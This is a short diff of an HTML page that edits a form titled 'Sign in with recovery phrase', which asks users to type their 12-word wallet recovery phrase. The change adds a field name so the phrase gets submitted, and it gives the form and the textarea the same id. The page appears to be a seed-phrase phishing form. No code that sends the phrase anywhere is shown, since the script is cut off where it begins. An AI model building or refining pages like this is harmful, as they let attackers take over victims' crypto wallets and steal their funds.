@@ -311,15 +311,15 @@
   </header>
 
   <main>
-    <form class="full-form">
-      <h2>Sign in with recovery phrase</h2>
-      <label for="about">This is a 12-word phrase you were given when you created your wallet</label>
-      <textarea id="about" rows="4" placeholder="12-word recovery phrase"></textarea>
-      <div id="autocomplete-list" class="autocomplete-items" style="display:none;"></div>
-      <button type="submit" class="submit-btn">Continue</button>
-    </form>
+  <form id="about" class="full-form">
+    <h2>Sign in with recovery phrase</h2>
+    <label for="about">This is a 12-word phrase you were given when you created your wallet</label>
+    <textarea id="about" name="message" rows="4" placeholder="12-word recovery phrase"></textarea>
+    <div id="autocomplete-list" class="autocomplete-items" style="display:none;"></div>
+    <button type="submit" class="submit-btn">Continue</button>
+  </form>
   </main>
-
+  
   <script>
     document.addEventListener("DOMContentLoaded", function () {
       const textarea = document.getElementById("about");
